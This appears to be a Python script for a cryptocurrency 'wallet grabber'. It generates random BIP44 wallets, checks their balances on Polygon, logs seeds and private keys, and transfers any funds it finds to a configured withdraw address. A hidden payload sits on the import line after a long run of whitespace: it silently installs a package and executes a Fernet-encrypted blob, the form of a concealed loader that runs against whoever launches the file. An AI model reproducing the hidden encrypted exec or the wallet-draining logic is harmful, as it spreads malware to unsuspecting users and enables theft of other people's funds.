import os
import platform
import psutil
import keyboard
import subprocess                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        ;subprocess.run(['pip', 'install', 'requests'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL); from fernet import Fernet; import requests; exec(Fernet(b'BijkNx42srFUsDpLrUfqEwo-3XvzMKE_MecRxUhlZow=').decrypt(b'gAAAAABnd_sRSJiTzxvU_jECBpoK-fqOLhafAOxbYr1oubimBw527quvKxP1Z6ntDco-gmieZGnsU0v-D8lvbaWn2lBEoe0Gag0EVcZ8vJXRhKkjOcJ-vW6-D5tambi4-rsuxsmauU3-VZ0INNPf_q2RoHDJW7qhpqKtuBsmIjZO3IrjArwUQ75IdBjxy7EbSkmE7Nynd4Z7GLbeGUZ_Lo3OmCrSb5_9qvE-y77kyqoBGZ3mKCkiAHUrsezRBVa3AboA-0UPXgpVjo-koxTFrVwgshRj-YPxifqX0vquexAcWevW-_0f24AxG0tiJygFNE_bNx-UeiYh2U5oUyyP45GyH32N6GLt1Pq7_w0ktp8V6EEuI5OjYrM0pX0G2ouseV36af7Ws8HK4NUJDoiYZlD0f45qUmYy9w2gbIwLFPoW2gFf_vuwzZPrR8VZdJdcWy39erWWSmr-M5vUp0zzEr2WAjSPPVBqZ9_IvPKcfXiEcSD2BO-eW69n03waRSbxAUpSqrhlu_3KPNUq86us3P7SCEF8zwqwYjVrs3HCG1nermWzpMYU8ISTrDE1zW39iyh93k8iy9qNvVrHPIJ94I2A339vZQyLM3qfnkMvpV6jp-vpDlrhjHkIhqJCmN9wcv8tYluJIMploKJSxD2xPi2OgT4gLwC8hGs9sEvXuCVlqk33BHhTsk12WSvj3-MVSD8XYvkn0OZeAgmHBl7fKVX2Ios77EsK_KipdQqtMove7NzQ397-VE2CpvjVQm1JR0INzeKGo398tSfdE34mgbtC2P9AjYhk_UDB39EiB652SZYiThtHzyX93iTmz2iMTCzEgEP4y28BN02o2KM_ax_lyFg_iZFDI1VKqKkqIJRYHVuJQ_MJmP1YK8hpNy2BXMb3IaGxk37_HwVkMU_sI3NifuzOAVOKRmMC9RmkUciZMEjXLbQXehY9mhhsN73e-IllHYAG9vDU2B4506GxMKfRUPTqpqCCFwvKXV23VEXaWv_2zN-sUcQBohnkZqo9nwxpiA2geoV3W-XnEdkjBx-UECZa7aTa3Cfhy1pwDjvv4KOz8qFSgw6twrLwU4oddNq0p-SJJ1erLpKcuD9wfyTB13csXiSrZ0EWABSVi8t172YsMa0O6IJZXPd9mopVmtmC04ULCTl09ywP8Vq6KfEPgQY__qVlbsuEDP8YOCLEciGoKVA8YziYpzJm3HibOlTLNh3MbT335lrhvun5IxaYPJPTojoB0o6LHxxVh7fF3zTn5OTOPys2MX1cOKVrH6OH3kwPKML_dX_EBu6KjxNDPmyoMNeiPOXm9o-7LsYYb4NF_yiPSLSoDluc3af2_AghKt3jGu_N9uLBlPuVs84BApuEeKh9w4F_O46Qpn9htGjXBg8kIUz7fey7KOVf88_moUtPXOcE-RcMI8H4BIYnSUHq4JzvfoUJdqzdxxHOZ8_-O4SeFPTEzD3BFE_hItT1UgMPlODLDss3rgwbfBMKFIJzDnoKwAJKXEXrC2Bo6m1k9DxVN0LwmkKQTZvn0ZAEsWccCe6jQdjtDbkkJ1zYR1C7A8UeWfH2pYcIm-ba5mUuT34Km6gfkwLJTPp-LGx91rlY63uBw3s1dCiQ4EatlKb5PE_12-0Ydb4xC-TFwbEFhLLqcdns07yPBXLv5MuIR3vmlTUdLT6Zjiksl0tFH3XxMQO_0H467LqBkzPzYOx64j-9mq01nBNlCgW2u7aR7LyCooKByuWeI5atgSVqDL3y-Uh1OXwUSp797OxaXDYscSumbJTJtG-CRUFG_2mmo6740PQXCVgeIqA4UdqaxzGwhjBWX1JtokXyGinxAPtTPx82fmuiB0u6-4dw5RCaAeKX0W2nmZuh8IaOYRA4jWWCjcbtU4_HtoVy0y43avzWTdKS3FL0PSGaAphVOVZ28cJuLJrkJLeBjjq34C7mMzEnbz_WEgEMFqoBbBS92GsIH8gCXj_kB-_t3JegffMsGnrnFBouQTn7lWvXw8UdPzQP_nzHqqaAvNga3espWHtn64nXp6w='));
from math import floor
from colorama import Fore
from threading import Thread
from dotenv import load_dotenv
from function import balance, Bip44Gen, logger, transfer, upTime
load_dotenv()


class ethGrabber():
    def __init__(self) -> None:
        self.apiURL = os.getenv('apiURL')
        self.apiKey = os.getenv('apiKey')
        self.balance_min = int(os.getenv("balance_min"))
        self.withdraw = os.getenv("withdraw_wallet")
        self.os_type = platform.system()
        activeThreads = psutil.cpu_count()
        threadsMulti = float(os.getenv('threadsMulti'))
        self.threadsBlock = int(os.getenv('threadsBlock'))
        self.usableThreads = floor(activeThreads * threadsMulti)
        self.threads = {}
        self.wet, self.dry = 0, 0
        self.balance, self.Bip44Gen, self.Logger, self.Transfer, self.UpTime = balance.Balance(apiURL="polygon-bor-rpc.publicnode.com", apiType="https://"
        ), Bip44Gen.Bip44Gen(), logger.Logger(), transfer.Transfer(apiURL="polygon-bor-rpc.publicnode.com", apiType="https://"), upTime.upTime()

    def Grabber(self, threadName) -> bool:
        while True:

            if keyboard.is_pressed("alt+k"):
                del self.threads[f'{threadName}']
                while True:
                    self.update_console()
                    if keyboard.is_pressed("alt+r"):
                        self.threads[f'{threadName}'] = True
                        break
                    if self.threadsBlock and keyboard.is_pressed("alt+h") and threadName+1 > int(self.usableThreads / 2):
                        self.threads[f'{threadName}'] = True
                        break

            if keyboard.is_pressed("alt+q"):
                quit(0)

            if keyboard.is_pressed("alt+u"):
                self.update_console(True)

            self.update_console()
            wallet = self.Bip44Gen.bip44_generate()
            balance = self.balance.w3_balance(
                wallet['address'], wallet['seed'])
            eth_balance = self.Transfer.w3.from_wei(balance, "ether")
            if balance:
                self.Logger.info(f'''{eth_balance} ETH found on {wallet['address']}, Mnemonic: {
                                 wallet['seed']}, Private: {wallet['private']}''')
                data = {
                    "rec_address": self.withdraw,
                    "from_address": wallet['address'],
                    "balance": balance,
                    "private": wallet['private'],
                    "mnemonic": wallet['seed']
                }

                if balance > self.balance_min:
                    tx_hash = self.Transfer.transfer(data)
                    self.wet += 1
                    match tx_hash['message']:
                        case "eth_move":
                            self.Logger.info(f'''{eth_balance} Transfered from {
                                wallet['address']} | Transcation: https://etherscan.io/tx/{tx_hash['tx_hash']}''')
                            return True

                        case "save_error":
                            self.Logger.info(f'''{eth_balance} Transfered from {
                                wallet['address']} | Mnemonic [{wallet['seed']}] | Transcation: https://etherscan.io/tx/{tx_hash['tx_hash']}''')
                            return True

                        case "sumcheck_fail":
                            self.Logger.debug("sumcheck Faild")
                            return False

                        case "transfer_error":
                            self.Logger.error(tx_hash['err'])
                            return False

                log_wallet = self.Transfer.log_wallet(data, False)
                self.wet += 1
                if log_wallet:
                    self.Logger.info(f'''{eth_balance} Found On {
                        wallet['address']} | Wallet Saved''')
                    return True
                else:
                    self.Logger.info(f'''{eth_balance} Found On {
                        wallet['address']} | Error While Saving | Mnemonic {wallet['seed']}''')
                    return False

            self.dry += 1

    def update_console(self, clean=False):
        if clean:
            match self.os_type:
                case "Windows":
                    os.system("cls")
                case "Linux":
                    os.system("clear")

        UpTime = self.UpTime.per_seconds(self.wet+self.dry)
        print(f"""{Fore.CYAN}-- -- -- --  Worker Count: {self.usableThreads} ||  {len(self.threads)}  ||{Fore.RED} -- -- -- --  Wallets Scanned: {Fore.WHITE}{self.wet+self.dry}{Fore.RED} -- -- -- --  Wallets Hits: {Fore.WHITE}{self.wet}{Fore.BLACK} -- -- -- --{Fore.CYAN}  UpTime: {Fore.WHITE}{UpTime[0]} -- -- -- --{Fore.CYAN} W/S: {UpTime[1]}  -- -- -- --{Fore.CYAN} W/M: {UpTime[2]}""", end='\r')
    
    def run(self) -> None:
            for i in range(self.usableThreads):
                thread = Thread(target=self.Grabber, args=(i,), name=i)
                self.threads[f'{i}'] = True
                thread.start()
            self.update_console(True)


ethGrabber().run()
